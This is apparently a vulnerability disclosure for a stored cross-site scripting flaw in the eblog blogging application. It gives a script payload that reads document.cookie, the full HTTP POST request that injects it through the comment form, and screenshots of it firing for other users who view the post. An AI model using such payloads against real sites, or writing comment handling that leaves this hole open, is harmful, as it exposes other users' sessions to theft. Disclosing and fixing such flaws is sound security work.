system url:https://github.com/MarkerHub/eblog  
Log in as a test007 user and leave a comment in the comments section of the post using the malicious code we have prepared.  
payload:<script>alert(document.cookie)</script>  
<img width="415" alt="image" src="https://github.com/biantaibao/eblog_xss/assets/131763503/602cc7f2-0b15-48db-aea1-e562231e6b9a">  
POC:  
POST /post/reply/ HTTP/1.1  
Host: localhost:8080  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 63  
Origin: http://localhost:8080  
Connection: close  
Referer: http://localhost:8080/post/2  
Cookie: Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1704964720; JSESSIONID=619AE47A2A22C9A7E23A64C324D778E1; Hm_lpvt_f8cddee34ca21f05373a9388cfdd798b=1704964720  

content=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&jid=2  


When other users log in and click on the post, malicious code will be triggered, taking MarkerHub users as an example.  
<img width="415" alt="image" src="https://github.com/biantaibao/eblog_xss/assets/131763503/1d91f4b6-a3f5-4dc2-9efe-e51107ff0bdc">

